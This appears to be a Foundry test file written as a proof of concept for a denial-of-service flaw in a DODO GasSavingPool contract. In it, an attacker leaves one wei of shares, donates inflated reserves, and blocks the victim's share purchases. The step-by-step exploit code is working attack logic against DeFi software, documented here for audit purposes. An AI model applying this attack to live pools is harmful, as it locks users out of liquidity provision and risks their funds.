// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import {GSPFunding} from "../../src/GasSavingPool/impl/GSPFunding.sol";
import {GSPVault} from "../../src/GasSavingPool/impl/GSPVault.sol";
import {DecimalMath} from "../../src/lib/DecimalMath.sol";
import {IERC20} from "../../src/intf/IERC20.sol";
import {IDODOCallee} from "../../src/intf/IDODOCallee.sol";

// Mock ERC20 token for testing
contract MockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Mock implementation of GSPVault for testing
contract MockGSPVault is GSPFunding {
    constructor(
        address baseToken,
        address quoteToken,
        address maintainer,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) GSPVault(baseToken, quoteToken, maintainer, i, k, isOpenTWAP) {}

    function _transferBaseOut(address to, uint256 amount) internal override {
        IERC20(_BASE_TOKEN_).transfer(to, amount);
    }

    function _transferQuoteOut(address to, uint256 amount) internal override {
        IERC20(_QUOTE_TOKEN_).transfer(to, amount);
    }

    function _sync() internal override {
        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));
        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));
        _setReserve(baseBalance, quoteBalance);
    }

    // Expose internal functions for testing
    function test_setReserve(uint256 baseReserve, uint256 quoteReserve) external {
        _setReserve(baseReserve, quoteReserve);
    }

    function test_sync() external {
        _sync();
    }
}

contract GSPFundingExploitTest is Test {
    MockGSPVault public pool;
    MockToken public baseToken;
    MockToken public quoteToken;
    
    address public attacker = address(0x1);
    address public victim = address(0x2);
    address public maintainer = address(0x3);

    function setUp() public {
        // Deploy mock tokens
        baseToken = new MockToken("Base Token", "BASE", 18);
        quoteToken = new MockToken("Quote Token", "QUOTE", 18);

        // Deploy the pool
        pool = new MockGSPVault(
            address(baseToken),
            address(quoteToken),
            maintainer,
            1e18, // _I_ parameter (1:1 ratio)
            1e18, // _K_ parameter
            false // isOpenTWAP
        );

        // Mint tokens to attacker and victim
        baseToken.mint(attacker, 10000e18);
        quoteToken.mint(attacker, 10000e18);
        baseToken.mint(victim, 1000e18);
        quoteToken.mint(victim, 1000e18);
    }

    function test_Exploit_DOS_Attack() public {
        console.log("=== DOS Attack PoC ===");
        
        // Step 1: Attacker initializes the pool with minimal liquidity
        console.log("\n--- Step 1: Attacker initializes pool ---");
        vm.startPrank(attacker);
        
        uint256 initBase = 1001;
        uint256 initQuote = 1001;
        
        baseToken.transfer(address(pool), initBase);
        quoteToken.transfer(address(pool), initQuote);
        
        (uint256 shares, uint256 baseInput, uint256 quoteInput) = pool.buyShares(attacker);
        
        console.log("Attacker initial shares:", shares);
        console.log("Attacker base input:", baseInput);
        console.log("Attacker quote input:", quoteInput);
        console.log("Pool total supply after init:", pool.totalSupply());
        
        // Verify attacker got exactly 1001 shares (minimum of base and quote)
        assertEq(shares, 1001, "Attacker should get 1001 shares");
        
        vm.stopPrank();

        // Step 2: Attacker sells back most shares, keeping only 1 wei
        console.log("\n--- Step 2: Attacker sells back most shares ---");
        vm.startPrank(attacker);
        
        uint256 sellAmount = 1000; // Keep 1 wei
        pool.sellShares(
            sellAmount,
            attacker,
            0, // baseMinAmount
            0, // quoteMinAmount
            "", // data
            block.timestamp + 3600 // deadline
        );
        
        console.log("Attacker remaining shares:", pool.balanceOf(attacker));
        console.log("Pool total supply after sell:", pool.totalSupply());
        
        // Verify attacker has exactly 1 wei of shares
        assertEq(pool.balanceOf(attacker), 1, "Attacker should have 1 wei share");
        assertEq(pool.totalSupply(), 1, "Pool should have 1 wei total supply");
        
        vm.stopPrank();

        // Step 3: Attacker donates large amounts to inflate reserves
        console.log("\n--- Step 3: Attacker donates to inflate reserves ---");
        vm.startPrank(attacker);
        
        uint256 donationAmount = 1000e18;
        baseToken.transfer(address(pool), donationAmount);
        quoteToken.transfer(address(pool), donationAmount);
        
        // Sync to update reserves
        pool.test_sync();
        
        console.log("Pool base reserve after donation:", pool._BASE_RESERVE_());
        console.log("Pool quote reserve after donation:", pool._QUOTE_RESERVE_());
        
        vm.stopPrank();

        // Step 4: Victim tries to buy shares but fails due to DOS
        console.log("\n--- Step 4: Victim attempts to buy shares (should fail) ---");
        vm.startPrank(victim);
        
        uint256 victimBase = 1000e18; // Large amount but less than 1001x attacker's balance
        uint256 victimQuote = 1000e18;
        
        baseToken.transfer(address(pool), victimBase);
        quoteToken.transfer(address(pool), victimQuote);
        
        // This should fail with "MINT_AMOUNT_NOT_ENOUGH"
        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        pool.buyShares(victim);
        
        console.log("Victim's buyShares failed as expected - DOS successful!");
        
        vm.stopPrank();

        // Step 5: Show what would be required to succeed
        console.log("\n--- Step 5: Demonstrate required amount for success ---");
        vm.startPrank(victim);
        
        // Calculate required amount: need >1000 shares to pass MINT_AMOUNT_NOT_ENOUGH
        // With totalSupply = 1, need mintRatio > 1000
        // With reserves ~1000e18, need input > 1000 * reserves = 1000 * 1000e18 = 1000000e18
        
        uint256 requiredAmount = 1001 * 1000e18; // Slightly more than minimum
        baseToken.mint(victim, requiredAmount);
        quoteToken.mint(victim, requiredAmount);
        
        baseToken.transfer(address(pool), requiredAmount);
        quoteToken.transfer(address(pool), requiredAmount);
        
        // This should succeed
        (uint256 successShares,,) = pool.buyShares(victim);
        
        console.log("Victim successful shares with huge amount:", successShares);
        assertTrue(successShares > 1000, "Should succeed with huge amount");
        
        vm.stopPrank();
    }

    function test_Vulnerability_Initialization_Share_Price() public {
        console.log("\n=== Testing Initialization Share Price Vulnerability ===");
        
        // Test with different initial deposit ratios
        vm.startPrank(attacker);
        
        // Test case 1: Equal amounts
        baseToken.transfer(address(pool), 1000e18);
        quoteToken.transfer(address(pool), 1000e18);
        (uint256 shares1,,) = pool.buyShares(attacker);
        console.log("Equal deposit shares:", shares1);
        
        // Reset pool
        vm.stopPrank();
        vm.startPrank(maintainer);
        // Note: In real scenario, would need to deploy new pool
        vm.stopPrank();
        
        // The vulnerability is that shares are based on minimum, not balanced ratio
        assertTrue(shares1 == 1000e18, "Shares based on minimum amount");
    }
}